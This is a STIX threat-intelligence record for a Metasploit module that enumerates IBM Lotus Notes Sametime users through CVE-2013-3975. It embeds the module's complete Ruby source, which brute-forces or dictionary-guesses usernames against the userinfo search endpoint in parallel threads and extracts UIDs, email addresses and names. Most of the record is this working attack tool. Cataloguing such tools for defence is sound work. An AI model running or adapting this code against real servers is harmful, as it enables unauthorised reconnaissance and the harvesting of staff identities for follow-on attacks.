{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--68b19476-c72b-43f5-9469-1dcfe6691b08",
    "created": "2024-08-14T16:32:24.437155Z",
    "modified": "2024-08-14T16:32:24.437159Z",
    "name": "IBM Lotus Notes Sametime User Enumeration",
    "description": " This module extracts usernames using the IBM Lotus Notes Sametime web interface using either a dictionary attack (which is preferred), or a bruteforce attack trying all usernames of MAXDEPTH length or less. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/ibm_sametime_enumerate_users.rb",
            "external_id": "ibm_sametime_enumerate_users.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3975"
        },
        {
            "source_name": "reference",
            "url": "http://www-01.ibm.com/support/docview.wss?uid=swg21671201"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'enumerable'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'IBM Lotus Notes Sametime User Enumeration',\n      'Description'    => %q{\n        This module extracts usernames using the IBM Lotus Notes Sametime web\n        interface using either a dictionary attack (which is preferred), or a\n        bruteforce attack trying all usernames of MAXDEPTH length or less.\n      },\n      'Author'         =>\n        [\n          'kicks4kittens' # Metasploit module\n        ],\n      'References' =>\n        [\n          [ 'CVE', '2013-3975' ],\n          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21671201']\n        ],\n      'DefaultOptions' =>\n        {\n          'SSL' => true\n        },\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2013-12-27'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('TARGETURI', [ true, 'The path to the userinfo script', '/userinfo/search']),\n         OptEnum.new('CHARSET', [true, 'Charset to use for enumeration', 'alpha', ['alpha', 'alphanum', 'num'] ]),\n        OptEnum.new('TYPE', [true, 'Specify UID or EMAIL', 'UID', ['UID', 'EMAIL'] ]),\n        OptPath.new('DICT', [ false,  'Path to dictionary file to use', '']),\n        OptInt.new('MAXDEPTH', [ true,  'Maximum depth to check during bruteforce', 2])\n      ])\n\n    register_advanced_options(\n      [\n        OptString.new('SpecialChars', [false, 'Specify special chars (e.g. -_+!@&$/\\?)', '' ]),\n        OptString.new('PREFIX', [ false,  'Defines set prefix for each guess (e.g. user)', '']),\n        OptString.new('SUFFIX', [ false,  'Defines set post for each quess (e.g. _adm)', '']),\n        OptInt.new('TIMING', [ true,  'Set pause between requests', 0]),\n        OptInt.new('Threads', [ true,  'Number of test threads', 10])\n      ])\n  end\n\n  def setup\n    # setup the desired charset\n    @charset = []\n    # setup array to hold user data\n    @user_data = []\n\n    if datastore['DICT'].blank?\n      # populate charset - lowercase only as search is case insensitive\n      case datastore['CHARSET']\n      when \"alpha\"\n        (\"a\"..\"z\").each { |alpha| @charset.push(alpha) }\n      when \"num\"\n        (\"0\"..\"9\").each { |num| @charset.push(num) }\n      when \"alphanum\"\n        (\"a\"..\"z\").each { |alpha| @charset.push(alpha) }\n        (\"0\"..\"9\").each { |num| @charset.push(num) }\n      end\n\n      if datastore['SpecialChars']\n        datastore['SpecialChars'].chars do | spec |\n          @charset.push(Rex::Text.uri_encode(spec))\n        end\n      end\n      print_status(\"Performing Bruteforce attack\")\n      vprint_status(\"Using CHARSET: [#{@charset.join(\",\")}]\")\n    else\n      print_status(\"Performing dictionary based attack (#{datastore['DICT']})\")\n    end\n\n    if datastore['DICT'].blank? and datastore['MAXDEPTH'] > 2\n      # warn user on long runs\n      print_status(\"Depth level #{datastore['MAXDEPTH']} selected... this may take some time!\")\n    end\n\n    # create initial test queue and populate\n    @test_queue = Queue.new\n    if datastore['DICT'].blank?\n      @charset.each { |char| @test_queue.push(char) }\n    else\n      ::File.open(datastore['DICT']).each { |line| @test_queue.push(line.chomp) }\n      vprint_status(\"Loaded #{@test_queue.length} values from dictionary\")\n    end\n\n    @depth_warning = true\n    @retries = []\n  end\n\n  def run\n    print_status(\"Testing for IBM Lotus Notes Sametime User Enumeration flaw\")\n\n    # test for expected response code on non-existant uid/email\n    if datastore['TYPE'] == \"UID\"\n      random_val = Rex::Text.rand_text_alpha(32)\n    else\n      random_val = Rex::Text.rand_text_alpha(32) +\"@\"+ Rex::Text.rand_text_alpha(16) + \".com\"\n    end\n\n    res = send_request_cgi({\n      'uri'     =>  normalize_uri(target_uri.path),\n      'method'  => 'GET',\n      'ctype'   => 'text/html',\n      'vars_get' => {\n        'mode' => datastore['TYPE'].downcase,\n        'searchText' => random_val\n      }\n    })\n\n    begin\n      if res.nil?\n        print_error(\"Timeout\")\n        return\n      elsif res.code != 200\n        print_error(\"Unexpected response from server (Response code: #{res.code})\")\n        return\n      elsif JSON.parse(res.body)\n        # valid JSON response - valid response for check\n        print_good(\"Response received, continuing to enumeration phase\")\n      end\n    rescue JSON::ParserError\n      print_error(\"Error parsing JSON: Invalid response from server\")\n      return\n    end\n\n    # start test handler\n    test_handler\n\n    # ouput results\n    output_results\n  end\n\n  def test_handler\n    print_status(\"Beginning tests using #{datastore['TYPE']} search method (#{datastore['Threads']} Threads)\")\n    test_length = 1 # initial test length set\n\n    until @test_queue.empty?\n      t = []\n      nt = datastore['Threads'].to_i\n      nt = 1 if nt == 0\n\n      if @test_queue.length < nt\n        # work around issue where threads not created as the queue isn't large enough\n        nt = @test_queue.length\n      end\n\n      begin\n        1.upto(nt) do\n          t << framework.threads.spawn(\"Module(#{self.refname})-#{rhost}\", false, @test_queue.shift) do |test_current|\n            Thread.current.kill if not test_current\n\n            # provide feedback to user on current test length\n            if datastore['DICT'].blank? and test_current.length > test_length\n              test_length = test_current.length\n              print_status(\"Beginning bruteforce test for #{test_length} character strings\")\n            end\n\n            res = make_request(test_current)\n\n            # check response to see if an error was returned, if so wait 1 second and retry\n            if res.nil? and not @retries.include?(test_current)\n              # attempt test again as the server was too busy to respond\n              # correctly - error returned\n              print_error(\"Error reading JSON response, attempting to redo check for \\\"#{test_current}\\\"\")\n              @test_queue.push(test_current)\n              @retries << test_current\n              if @retries.length == 10\n                print_error(\"Excessive number of retries detected (#{@retries.length}... check the TIMING and Threads options)\")\n              end\n            elsif res\n              # check response for user data\n              check_response(res, test_current)\n            end\n          end\n        end\n      t.each {|x| x.join }\n\n      rescue ::Timeout::Error\n      ensure\n        t.each {|x| x.kill rescue nil }\n      end\n    end\n  end\n\n  # make request and return response\n  def make_request(test_current)\n    # combine test string with PRE and POST variables\n    tstring = datastore['PREFIX'] + test_current + datastore['SUFFIX'] + \"*\"\n    # Apply timing information to pause between making requests - not a timeout\n    if datastore['TIMING'] > 0\n      Rex::sleep(datastore['TIMING'])\n    end\n\n    res = send_request_cgi({\n      'uri'     =>  normalize_uri(target_uri.path),\n      'method'  => 'GET',\n      'ctype'   => 'text/html',\n      'vars_get' => {\n        'mode' => datastore['TYPE'].downcase,\n        'searchText' => tstring\n      }\n    })\n  end\n\n  # check the response for valid user information\n  def check_response(res, test_current)\n    begin\n      # check response exists AND that it validates as JSON before proceeding\n      if res.code.to_i == 200 and not JSON.parse(res.body).blank?\n        # successful response - extract user data\n        extract_user(res)\n        # extend test_queue to search for further data (not if dictionary in use)\n        extend_queue(test_current) if (datastore['DICT'].blank?)\n      end\n    rescue JSON::ParserError\n      # non-JSON response - server may be overloaded\n      return error\n    end\n  end\n\n  def extract_user(res)\n    # extract user data if not already present\n    begin\n      userinfo = JSON.parse(res.body)\n      unless @user_data.flatten.include?(userinfo['uid'])\n        @user_data << [ userinfo['uid'], userinfo['mail'] || \"-\", userinfo['externalName'] || \"-\" ]\n        # print newly discovered users straight to the screen if verbose mode is set\n        vprint_good(\"New user found: #{userinfo['uid']}\")\n        report_user(userinfo['uid'])\n      end\n    rescue JSON::ParserError\n      print_error(\"Error reading JSON string, continuing\")\n    end\n  end\n\n  # extend the test queue if MAXDEPTH value not exceeded\n  # checks made to ensure duplicates are not created when extending\n  # process:\n  #\n  # when a user is found searching for 'a' the queue for 'a' is extended as\n  # only the first user starting with 'a' will be returned (e.g. 'aanderson')\n  # To find all users the queue must be extended by adding 'aa' through to 'az'\n  def extend_queue(test_current)\n    if test_current.length < datastore['MAXDEPTH']\n      @charset.each do | char |\n        @test_queue.push(test_current + char)\n      end\n    elsif @depth_warning and test_current.length == datastore['MAXDEPTH'] and datastore['MAXDEPTH'] > 1\n      vprint_status(\"Depth limit reached [#{datastore['MAXDEPTH']} levels deep] finishing up current tests\")\n      @depth_warning = false\n    end\n  end\n\n  def report_user(username)\n    report_note(\n      :host   => rhost,\n      :port   => rport,\n      :proto  => 'tcp',\n      :sname  => 'sametime',\n      :type   => 'ibm_lotus_sametime_user',\n      :data   => \"#{username}\",\n      :update => :unique_data\n    )\n  end\n\n  def output_results\n    # print output table\n\n    user_tbl = Msf::Ui::Console::Table.new(\n      Msf::Ui::Console::Table::Style::Default,\n      'Header'  => \"IBM Lotus Sametime Users\",\n      'Prefix'  => \"\\n\",\n      'Indent'  => 1,\n      'Columns'   =>\n      [\n        \"UID\",\n        \"Email\",\n        \"CommonName\"\n      ])\n\n    # populate tables\n    @user_data.each do | line |\n      user_tbl << [ line[0], line[1], line[2] ]\n    end\n\n    if not user_tbl.to_s.empty?\n      print_good(\"#{@user_data.length} users extracted\")\n      print_line(user_tbl.to_s)\n    else\n      print_error(\"No users discovered\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-12-27"
}